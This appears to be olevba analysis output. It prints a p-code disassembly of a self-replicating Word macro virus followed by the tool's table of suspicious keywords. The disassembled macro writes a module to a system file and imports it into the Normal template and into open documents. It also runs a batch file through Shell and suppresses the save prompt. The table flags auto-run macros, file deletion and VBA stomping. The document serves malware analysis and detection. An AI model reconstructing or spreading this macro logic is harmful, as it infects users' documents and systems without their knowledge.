' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #670:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #671:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #672:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #673:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #674:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #675:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo look 
' Line #676:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #677:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #678:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #679:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #680:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #681:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #682:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #683:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St i 
' Line #684:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #685:
' 	Label notemp 
' Line #686:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #687:
' 	CloseAll 
' Line #688:
' 	Label look2 
' Line #689:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #690:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #691:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #692:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #693:
' 	LineCont 0x0004 01 00 00 00
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #694:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #695:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #696:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0014 
' 	St i 
' Line #697:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #698:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #699:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #700:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #701:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #702:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #703:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #704:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #705:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #706:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #707:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #708:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #709:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo look2 
' Line #710:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #711:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #712:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #713:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #714:
' 	Label noactsave 
' Line #715:
' 	ElseBlock 
' Line #716:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #717:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #718:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #719:
' 	Label NoDocL 
' Line #720:
' 	ElseBlock 
' Line #721:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #722:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #723:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #724:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #725:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #726:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #727:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #728:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #729:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #730:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #731:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #732:
' Line #733:
' Line #734:
' Line #735:
' Line #736:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

